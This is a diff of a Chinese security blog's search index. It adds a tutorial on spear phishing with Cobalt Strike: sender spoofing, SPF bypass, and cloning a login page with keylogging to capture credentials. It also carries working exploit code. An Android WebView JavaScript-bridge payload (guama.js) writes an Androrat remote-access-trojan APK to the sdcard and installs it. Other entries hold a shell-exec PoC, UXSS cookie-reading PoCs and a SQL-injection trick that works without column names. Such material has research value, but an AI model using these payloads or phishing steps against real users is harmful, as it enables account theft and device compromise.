@@ -1,6 +1,18 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title><![CDATA[Cobalt Strike Spear Phish]]></title>
+    <url>%2Farchives%2Fspear_phish.html</url>
+    <content type="text"><![CDATA[0x00 简介关于Spear phish 和发件人伪造的工具有很多个，比如gophish、SimpleEmailSpoofer、命令行工具swaks等，每个工具都有其特点，当然Cobalt Strike也有此功能。官方介绍戳我。今天主要来介绍一下CS里面的此功能怎么使用。 0x01 CS Spear PhishCS的Spear Phish位置在： 一张图说明功能： 使用此功能的前提是需要有一个smtp服务器来供我们来转发邮件，当然可以使用公共smtp服务，另外也可以参考《Something about email spoofing》 中提到的方法来搭建。这里的使用很简单，首先构造目标列表，使用：12mail namemail name 中间的分隔符为[tab],可以不添加name 添加好以后就是这个样子： 下面，要配置发件模板，这里配置很简单，只需要复制一份原始邮件即可，比如一份密码重置邮件： 选择显示原始邮件，并将其内容保存。 在这里如果要伪造发件人，需要修改From: 否则就不需要做什么别的修改。之后，配置对应的Mail server，就可以进行发送邮件了，这里需要注意一点,为了绕过SPF的检查，Bunce to需设置为与Mail server同域，如Mail server为 mail.evi1cg.me,Bunce to可设置为`admin@evi1cg.me`。 之后点击Send则可发送邮件，收到的邮件与模板一致。 另外查看SRF为PASS状态： 另外，CS也有发送附件的功能，但是原版本的CS发送附件有一个Bug，即如果附件为中文名称，则会在最后的邮件中显示乱码附件： 所以在这里我们需要对CS动刀了，经过调试，成功定位到mail\Eater.java，需要对此类中的createAttachment方法进行修改：1234567891011121314private BodyPart createAttachment(String name) throws IOException &#123; File file = new File(name); String namez = file.getName(); String filename = new String(namez.getBytes("utf-8"),"ISO8859-1"); Body body = (new StorageBodyFactory()).binaryBody((InputStream)(new FileInputStream(name))); Map temp = new HashMap(); temp.put("name", filename); BodyPart bodyPart = new BodyPart(); bodyPart.setBody(body, "application/octet-stream", temp); bodyPart.setContentTransferEncoding("base64"); bodyPart.setContentDisposition("attachment"); bodyPart.setFilename(filename); return bodyPart;&#125; 这样就可以解决附件乱码问题了: 0x02 Web clone另外在这里还有一个与Web Clone结合的地方，首先，我们先Clone一个需登录的网站，如网易邮箱： 这里可以选择开启键盘记录功能。 开启Clone： 设置spear phish: Embed URL选择刚刚克隆的url，发送邮件，此时用户点击重置按钮，则会跳转到Clone的站点： 此时，用户输入会被记录： emmm. 大概就介绍这么多吧。]]></content>
+      <categories>
+        <category>工具收集</category>
+      </categories>
+      <tags>
+        <tag>cobaltstrike</tag>
+        <tag>phishing</tag>
+      </tags>
+  </entry>
+  <entry>
     <title><![CDATA[不知道列名的情况下注入]]></title>
     <url>%2Farchives%2Fsqli_without_knowing_columns_names.html</url>
     <content type="text"><![CDATA[0x00 简介在 mysql =&gt; 5 的版本中存在库information_schema,记录着mysql中所有表的结构，通常，在mysql sqli中，我们会通过此库中的表去获取其他表的结构，即表名，列名等。但是这个库也会经常被WAF过滤。当我们通过暴力破解获取到表名后，该如何进行下一步利用呢？ 在information_schema中，除了SCHEMATA，TABLES，COLUMNS有表信息外，高版本的mysql中，还有INNODB_TABLES及INNODB_COLUMNS中记录着表结构。 0x01 不使用表名查询正常的查询如下： 其中，列名为id,name,pass,mail,phone，使用union查询1select 1,2,3,4,5 union select * from users; 接着，就可以继续使用数字来对应列,如3对应了表里面的pass:1select `3` from (select 1,2,3,4,5 union select * from users)a; 当 ` 不能使用的时候，使用别名来代替：1select b from (select 1,2,3 as b,4,5 union select * from users)a; 在注入中查询多个列：1select concat(`2`,0x3a,`3`) from (select 1,2,3,4,5 union select * from users)a limit 1,1; FROM:Extracting data without knowing columns names]]></content>
@@ -1025,11 +1037,6 @@
     <content type="text"><![CDATA[&lt;!DOCTYPE html&gt; 404 L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"log":false,"model":{"jsonPath":"/live2dw/assets/z16.model.json"},"display":{"position":"left","width":80,"height":120,"hOffset":30,"vOffset":0},"mobile":{"show":true}});]]></content>
   </entry>
   <entry>
-    <title><![CDATA[Archive]]></title>
-    <url>%2Farchive%2Findex.html</url>
-    <content type="text"></content>
-  </entry>
-  <entry>
     <title><![CDATA[Categories]]></title>
     <url>%2Fcategories%2Findex.html</url>
     <content type="text"></content>
@@ -1040,13 +1047,18 @@
     <content type="text"><![CDATA[快来交换友链吧~~ 交换友链须知 优先于技术、生活分享类博客站点友链，坚决不和论坛、导航、含有暴力等不健康信息内容站点做任何交换。 申请链接前请先添加本博链接。 申请请提供：站点名称、站点链接（请提供 https 协议链接）。 一些大佬和他们的博客。 三好学生博客 zEqueue’s Blog erevus’s blog Evi1oX’s blog 维尼熊宝贝Beta的熊窝 bsmali4的小窝 wdog’s blog Storm’s Blog freearoot’s Blog bPJoanna]]></content>
   </entry>
   <entry>
-    <title><![CDATA[search]]></title>
-    <url>%2Fsearch%2Findex.html</url>
+    <title><![CDATA[Archive]]></title>
+    <url>%2Farchive%2Findex.html</url>
     <content type="text"></content>
   </entry>
   <entry>
     <title><![CDATA[Tags]]></title>
     <url>%2Ftags%2Findex.html</url>
+    <content type="text"></content>
+  </entry>
+  <entry>
+    <title><![CDATA[search]]></title>
+    <url>%2Fsearch%2Findex.html</url>
     <content type="text"></content>
   </entry>
   <entry>
@@ -1056,13 +1068,13 @@
   </entry>
   <entry>
     <title></title>
-    <url>%2Ftools%2Fwebview.html</url>
-    <content type="text"><![CDATA[WebView 漏洞检测 如果当前 app 存在漏洞，将会在页面中输出存在漏洞的接口方便程序员做出修改： function check() { for (var obj in window) { try { if ("getClass" in window[obj]) { try{ window[obj].getClass(); document.write(''+obj+''); document.write(''); }catch(e){ } } } catch(e) { } } } check(); 检测出漏洞使用以下脚本验证(自行修改)： 1 .写文件 2 .反弹shell 3 .发短信 3 .挂马 参考 L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"log":false,"model":{"jsonPath":"/live2dw/assets/z16.model.json"},"display":{"position":"left","width":80,"height":120,"hOffset":30,"vOffset":0},"mobile":{"show":true}});]]></content>
+    <url>%2Ftools%2Fweibo.html</url>
+    <content type="text"><![CDATA[weibo test console.log('init...'); window.__fla_ready = function() { console.log('loading...'); fla.Load('http://www.weibo.com/messages?topnav=1#'); }; window.__fla_complete = function(data) { document.write(data); console.info('recv:\n%s', data); };]]></content>
   </entry>
   <entry>
     <title></title>
-    <url>%2Ftools%2Fweibo.html</url>
-    <content type="text"><![CDATA[weibo test console.log('init...'); window.__fla_ready = function() { console.log('loading...'); fla.Load('http://www.weibo.com/messages?topnav=1#'); }; window.__fla_complete = function(data) { document.write(data); console.info('recv:\n%s', data); };]]></content>
+    <url>%2Ftools%2Fwebview.html</url>
+    <content type="text"><![CDATA[WebView 漏洞检测 如果当前 app 存在漏洞，将会在页面中输出存在漏洞的接口方便程序员做出修改： function check() { for (var obj in window) { try { if ("getClass" in window[obj]) { try{ window[obj].getClass(); document.write(''+obj+''); document.write(''); }catch(e){ } } } catch(e) { } } } check(); 检测出漏洞使用以下脚本验证(自行修改)： 1 .写文件 2 .反弹shell 3 .发短信 3 .挂马 参考 L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"log":false,"model":{"jsonPath":"/live2dw/assets/z16.model.json"},"display":{"position":"left","width":80,"height":120,"hOffset":30,"vOffset":0},"mobile":{"show":true}});]]></content>
   </entry>
   <entry>
     <title></title>
@@ -1071,18 +1083,8 @@
   </entry>
   <entry>
     <title></title>
-    <url>%2Ftools%2Fuxss%2Fpoc2.html</url>
-    <content type="text"><![CDATA[i = document.body.appendChild(document.createElement("iframe")); i.src = "http://m.baidu.com"; i.onload = function() { document.documentURI = "javascript://hostname.com/%0D%0Aalert('OH HAI ' + location)"; i.contentWindow.location = ""; } L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"log":false,"model":{"jsonPath":"/live2dw/assets/z16.model.json"},"display":{"position":"left","width":80,"height":120,"hOffset":30,"vOffset":0},"mobile":{"show":true}});]]></content>
-  </entry>
-  <entry>
-    <title></title>
     <url>%2Ftools%2Fwebviewpoc%2Fguama.js</url>
     <content type="text"><![CDATA[function execute(cmdArgs) { return xxx.getClass().forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null).exec(cmdArgs); } var armBinary1 = "x50x4Bx03x04x14x00x08x00x08x00x51x8FxCAx40x00x00x00x00x00x00x00x00x00x00x00x00x13x00x04x00x72x65x73x2Fx6Cx61x79x6Fx75x74x2Fx6Dx61x69x6Ex2Ex78x6Dx6CxFExCAx00x00xADx52x31x6FxD3x40x18xFDx2Ex76xAEx86xC4x69x5Ax3Ax54xA2x12xA9xC4 var armBinary2="x1BxB0x65x0AxADx23xC2x30x64xDFxEExA1x0DxA4xE8x3Fx61x80xEExBCxE1xE7x7Bx4Ax25x6Fx8Bx36x71xC3x80x81x58xDBxC9x8Fx53x9FxEEx8Ax45xAFx23x54x4AxCFx2Bx52xF2x33x84xBAx82x36xC4x0Dx08xAFxC2x61x8ExD8x7Bx0BxFCx88x4Ax25x24x8Cx22xFAx76x44x78x5Ex99x62x30x44x8DxDBx74x94 var armBinary3=… var armBinary4=… …… var patharm = "/mnt/sdcard/Androrat.apk"; var a=execute(["/system/bin/sh","-c","echo -n +armBinary1+ > " + patharm]); //alert(a); execute(["/system/bin/sh","-c","echo -n +armBinary2+ >> " + patharm]); execute(["/system/bin/sh","-c","echo -n +armBinary3+ >> " + patharm]); execute(["/system/bin/sh","-c","echo -n +armBinary4+ >> " + patharm]); execute(["/system/bin/sh","-c","adb install /mnt/sdcard/Androrat.apk"]); alert("over !!!");]]></content>
-  </entry>
-  <entry>
-    <title></title>
-    <url>%2Ftools%2Fuxss%2Fpoc1.html</url>
-    <content type="text"><![CDATA[frame = document.body.appendChild(document.createElement("iframe")); frame.src = "http://m.baidu.com/"; frame.onload = function() { Function("}, (builtins = this), function() {"); originalInstantiate = builtins.Instantiate; builtins.DefineOneShotAccessor(builtins, "Instantiate", function() {}); flag = 0; template = null; builtins.Instantiate = function(x, y) { if (flag) { doc = frame.contentWindow.document; alert(doc.cookie); flag = 0; } else if (!template) template = x; return originalInstantiate(x, y); }; document.implementation; flag = 1; builtins.ConfigureTemplateInstance(frame.contentWindow, template); } L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"log":false,"model":{"jsonPath":"/live2dw/assets/z16.model.json"},"display":{"position":"left","width":80,"height":120,"hOffset":30,"vOffset":0},"mobile":{"show":true}});]]></content>
   </entry>
   <entry>
     <title></title>
@@ -1093,6 +1095,16 @@
     <title></title>
     <url>%2Ftools%2Fwebviewpoc%2Fwrite.js</url>
     <content type="text"><![CDATA[function execute(cmdArgs) { return searchBoxJavaBridge_.getClass().forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null).exec(cmdArgs); } try{ execute(["/system/bin/sh","-c","echo 'Hello world' > /sdcard/goot.txt"]); }catch(e){ alert(e); }]]></content>
+  </entry>
+  <entry>
+    <title></title>
+    <url>%2Ftools%2Fuxss%2Fpoc2.html</url>
+    <content type="text"><![CDATA[i = document.body.appendChild(document.createElement("iframe")); i.src = "http://m.baidu.com"; i.onload = function() { document.documentURI = "javascript://hostname.com/%0D%0Aalert('OH HAI ' + location)"; i.contentWindow.location = ""; } L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"log":false,"model":{"jsonPath":"/live2dw/assets/z16.model.json"},"display":{"position":"left","width":80,"height":120,"hOffset":30,"vOffset":0},"mobile":{"show":true}});]]></content>
+  </entry>
+  <entry>
+    <title></title>
+    <url>%2Ftools%2Fuxss%2Fpoc1.html</url>
+    <content type="text"><![CDATA[frame = document.body.appendChild(document.createElement("iframe")); frame.src = "http://m.baidu.com/"; frame.onload = function() { Function("}, (builtins = this), function() {"); originalInstantiate = builtins.Instantiate; builtins.DefineOneShotAccessor(builtins, "Instantiate", function() {}); flag = 0; template = null; builtins.Instantiate = function(x, y) { if (flag) { doc = frame.contentWindow.document; alert(doc.cookie); flag = 0; } else if (!template) template = x; return originalInstantiate(x, y); }; document.implementation; flag = 1; builtins.ConfigureTemplateInstance(frame.contentWindow, template); } L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"log":false,"model":{"jsonPath":"/live2dw/assets/z16.model.json"},"display":{"position":"left","width":80,"height":120,"hOffset":30,"vOffset":0},"mobile":{"show":true}});]]></content>
   </entry>
   <entry>
     <title></title>
